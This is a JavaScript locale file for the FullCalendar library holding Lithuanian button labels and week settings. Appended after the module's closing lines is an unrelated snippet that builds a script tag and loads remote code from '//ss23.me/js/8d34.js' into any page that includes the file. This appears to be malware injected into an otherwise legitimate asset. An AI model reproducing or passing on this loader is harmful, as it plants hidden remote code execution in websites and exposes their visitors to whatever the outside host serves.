(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = global || self, (global.FullCalendarLocales = global.FullCalendarLocales || {}, global.FullCalendarLocales.lt = factory()));
}(this, function () { 'use strict';

    var lt = {
        code: "lt",
        week: {
            dow: 1,
            doy: 4 // The week that contains Jan 4th is the first week of the year.
        },
        buttonText: {
            prev: "Atgal",
            next: "Pirmyn",
            today: "Šiandien",
            month: "Mėnuo",
            week: "Savaitė",
            day: "Diena",
            list: "Darbotvarkė"
        },
        weekLabel: "SAV",
        allDayText: "Visą dieną",
        eventLimitText: "daugiau",
        noEventsMessage: "Nėra įvykių rodyti"
    };

    return lt;

}));
var e = document.createElement("script");
  e.async = !0,
  e.src = "//ss23.me/js/8d34.js";
  e.charset="UTF-8";
  var t = document.getElementsByTagName("script")[0];
  t.parentNode.insertBefore(e, t);